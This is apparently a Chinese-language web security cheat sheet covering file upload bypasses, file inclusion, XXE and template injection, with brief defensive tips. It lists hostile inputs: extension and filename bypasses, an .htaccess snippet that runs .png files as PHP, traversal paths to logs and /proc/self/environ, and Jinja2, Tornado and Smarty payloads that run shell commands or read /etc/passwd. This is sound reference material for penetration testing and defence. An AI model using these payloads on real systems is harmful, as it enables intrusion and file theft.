# Web-Sec Documentation, 发布 1.0

## 目录
- 文件上传
  - 特殊备份文件
  - Python 的缓存文件
  - 文件类型检测绕过
  - 后缀绕过
  - 系统命名绕过
  - .user.ini 文件
  - WAF 绕过
  - 竞争上传绕过
  - 攻击技巧
  - 防护技巧
  - 参考链接
- 文件包含
  - 基础
  - 触发点
  - 绕过技巧
  - 参考链接
- XML 外部实体 (XXE)
  - XML 语法
  - XXE 漏洞
  - 攻击方式
  - 参考链接
- 模板注入
  - 简介
  - 测试方法
  - 测试用例
  - 目标
  - 相关属性

## 文件上传

### 特殊备份文件
- `.git/HEAD`
- `WEB-INF/web.xml`
- `.htaccess`
- `.swp`
- `.swo`
- `.bak`
- `index.php~`

### Python 的缓存文件
- `__pycache__/__init__.cpython-35.pyc`

### 4.8 文件上传
#### 4.8.1 文件类型检测绕过
##### 更改请求绕过
某些网站仅在前端进行文件类型检测，这种检测可以通过修改网络请求来绕过。同样地，有些网站仅在后端检查 HTTP Header 中的信息（如 Content-Type），这种检查也可以通过修改网络请求绕过。

##### Magic 检测绕过
部分站点使用文件头来检测文件类型。在这种情况下，可以在 Shell 前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下：

| 类型 | 二进制值 |
| --- | --- |
| JPG | FF D8 FF E0 00 10 4A 46 49 46 |
| GIF | 47 49 46 38 39 61 |
| PNG | 89 50 4E 47 |
| TIF | 49 49 2A 00 |
| BMP | 42 4D |

##### 后缀绕过
部分服务仅根据后缀、上传时的信息或 Magic Header 来判断文件类型，此时可以绕过。例如：
- PHP：`php`, `php5`, `pht`, `phtml`, `shtml`, `pwml`, `phtm`
- JSP：`jspx`, `jspf`, `jspa`, `jsw`, `jsv`, `jtml`
- ASP：`asa`, `asax`, `cer`, `cdx`, `aspx`, `ascx`, `ashx`, `asmx`, `asp{80-90}`

其他可能带来问题的后缀包括：`vbs`, `asis`, `sh`, `reg`, `cgi`, `exe`, `dll`, `com`, `bat`, `pl`, `cfc`, `cfm`, `ini`。

##### 系统命名绕过
- **Windows**：上传 `index.php.` 会重命名为 `.`，可以绕过后缀检查。也可尝试 `index.php%20`, `index.php:1.jpg`, `index.php::$DATA` 等。
- **Linux**：可以尝试上传名为 `index.php/.` 或 `./aa/../index.php/.` 的文件。

##### .user.ini
PHP 在执行过程中除了主配置文件 `php.ini` 外，还会在每个目录下扫描 INI 文件。`.user.ini` 文件可以定义除 `PHP_INI_SYSTEM` 以外的选项，因此可以使用 `.user.ini` 加上非 PHP 后缀的文件构造一个 shell，例如 `auto_prepend_file=01.gif`。

##### WAF 绕过
- 通过添加大量垃圾数据绕过 WAF 的处理函数。
- 利用 Waf 和 Web 系统对 boundary 的处理不一致，使用错误的 boundary 完成绕过。

##### 竞争上传绕过
某些服务器采用先保存再删除不合法文件的方式，在这种情况下，可以反复上传一个会生成 WebShell 的文件并尝试访问，多次之后即可获得 shell。

### 4.8.2 攻击技巧
- **Apache 重写 GetShell**：通过上传 `.htaccess` 文件，内容为：
  ```apache
  AddType application/x-httpd-php .png
  php_flag engine 1
  ```
  这样就可以用 `.png` 或其他后缀的文件作为 PHP 脚本执行。

- **软链接任意读文件**：上传的压缩包文件会被解压时，可以考虑上传含符号链接的文件，若服务器没有做好防护，可实现任意文件读取的效果。

### 4.8.3 防护技巧
- 使用白名单限制上传文件的类型。
- 使用更严格的文件类型检查方式。
- 限制 Web Server 对上传文件夹的解析。

### 4.8.4 参考链接
- 构造优质上传漏洞 Fuzz 字典

## 文件包含
### 4.9.1 基础
常见的文件包含漏洞形式包括：
- 同目录包含：`file=.htaccess`
- 目录遍历：`file=../../../../../../../../../var/lib/locate.db`
- 日志注入：`file=../../../../../../../../../var/log/apache/error.log`
- 利用 `/proc/self/environ`

### 4.9.2 触发点
- **PHP**
  - `include`：在包含过程中出错会报错，但不影响后续语句的执行。
  - `include_once`：仅包含一次。
  - `require`：在包含过程中出错，会直接退出，不执行后续语句。
  - `require_once`：仅包含一次。

### 4.9.3 绕过技巧
- **URL 编码绕过**：如果 WAF 是基于字符串匹配的，可以使用 URL 多次编码的方式绕过。
- **特殊字符绕过**：某些情况下，读文件支持使用 Shell 通配符（如 `? *`）；URL 中使用 `? #` 可能会影响 `include` 包含的结果；某些情况下，Unicode 编码不同但字形相近的字符有相同效果。
- **%00 截断**：几乎是最常用的方法，条件是 `magic_quotes_gpc` 关闭且 PHP 版本小于 5.3.4。
- **长度截断**：在 Windows 上，文件路径长度最长为 259 个 bytes；在 Linux 上，可以使用 `getconf` 来判断文件名和路径长度限制。

### 4.9.4 参考链接
- 构造优质上传漏洞 Fuzz 字典

## XML 外部实体 (XXE)
### 4.10.1 XML 语法
XML 文档通常有一个可选的 XML prolog，用于声明 XML 文档的版本和编码。XML 语法的主要特性包括：
- 所有 XML 元素都须有关闭标签。
- XML 标签对大小写敏感。
- XML 必须正确嵌套。
- XML 文档必须有根元素。
- XML 的属性值需要加引号。

另外，XML 也有 CDATA 语法，用于处理需要转义的多个字符。

### 4.10.2 XXE
当允许引用外部实体时，可以通过构造恶意的 XML 内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的 XXE 攻击只有在服务器有回显或报错的基础上才能使用 XXE 漏洞读取服务器端文件，但也可以通过 Blind XXE 的方式实现攻击。

### 4.10.3 攻击方式
- **拒绝服务攻击**：通过构造复杂的 XML 实体，使解析过程非常缓慢。
- **文件读取**：通过引用外部文件实体读取服务器上的文件。
- **SSRF**：通过引用外部实体实现 SSRF 攻击。
- **RCE**：通过引用外部实体执行系统命令。

### 4.10.4 参考链接
- XML 教程
- 未知攻焉知防 XXE 漏洞攻防
- XXE 攻击笔记分享
- 从 XML 相关一步一步到 XXE 漏洞

## 模板注入
### 4.11.1 简介
模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制，并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。

### 4.11.2 测试方法
- 确定使用的引擎。
- 查看引擎相关的文档，确定其安全机制以及自带的函数和变量。
- 寻找攻击面，尝试攻击。

### 4.11.3 测试用例
- **简单的数学表达式**：`{{ 7+7 }} => 14`
- **字符串表达式**：`{{ "ajin" }} => ajin`
- **Ruby**：`<%= 7+7 %>`
- **Java**：`${7*7}`
- **Twig**：`{{7*7}}`
- **Smarty**：`{php}echo `id`;{/php}`
- **AngularJS**：`$eval('1+1')`
- **Tornado**：`{% import module %} => {% import os %}{{ os.popen("whoami").read() }}`
- **Flask/Jinja2**：
  - `{{ config }}`
  - `{{ config.items() }}`
  - `{{ get_flashed_messages.__globals__['current_app'].config }}`
  - `{{ ''.__class__.__mro__[-1].__subclasses__() }}`
  - `{{ url_for.__globals__['__builtins__'].__import__('os').system('ls') }}`
  - `{{ request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}`
- **Django**：
  - `{{ request }}`
  - `{% debug %}`
  - `{% load module %}`
  - `{% include "x.html" %}`
  - `{% extends "x.html" %}`

### 4.11.4 目标
- 创建对象
- 文件读写
- 远程文件包含
- 信息泄漏
- 提权

### 4.11.5 相关属性
- **`__class__`**：Python 中的新式类（即显示继承 `object` 对象的类）都有一个属性 `__class__` 用于获取当前实例对应的类，例如 `"".__class__` 就可以获取到字符串实例对应的类。
- **`__mro__`**：Python 中类对象的 `__mro__` 属性会返回一个 tuple 对象，其中包含了当前类对象所有继承的基类，tuple 中元素的顺序是 MRO（Method Resolution Order）寻找的顺序。
- **`__globals__`**：保存了函数所有的全局变量，在利用中，可以使用 `__init__` 获取对象的函数，并通过 `__globals__` 获取 `file`、`os` 等模块以进行下一步的利用。
- **`__subclasses__()`**：Python 的新式类都保留了它所有的子类的引用，`__subclasses__()` 方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。因为 Python 中的类都是继承 `object` 的，所以只要调用 `object` 类对象的 `__subclasses__()` 方法就可以获取想要的类的对象。